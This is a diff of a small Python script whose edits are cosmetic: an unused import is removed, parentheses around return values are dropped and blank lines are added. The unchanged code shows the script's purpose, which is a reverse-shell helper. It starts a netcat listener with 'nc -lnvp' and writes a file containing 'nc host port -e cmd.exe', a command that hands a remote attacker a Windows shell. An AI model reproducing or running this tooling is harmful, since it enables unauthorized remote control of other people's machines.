@@ -1,4 +1,3 @@
-import os
 import time
 import subprocess
 from subprocess import Popen,PIPE
@@ -28,7 +27,9 @@ bandaid = '-e cmd.exe'
 time.sleep(1)
 
 print("Select an option... \n\n")
+
 time.sleep(1)
+
 def main():
     while True:
         beginning = input(
@@ -40,7 +41,7 @@ def main():
                 cmd = subprocess.check_output(
                    'nc -lnvp' + str(ncport), shell=True
                     ).splitlines()
-                return (cmd)
+                return cmd
             except subprocess.CalledProcessError:
                 print("Disconnected!")
                 exit()
@@ -51,7 +52,7 @@ def main():
             with open(nameoffile, 'w') as f:
                 f.write(f"nc {nchost} {ncport} {bandaid}")
             print(f"{nameoffile} created.")
-            return (nameoffile)
+            return nameoffile
             break
         else:
             break
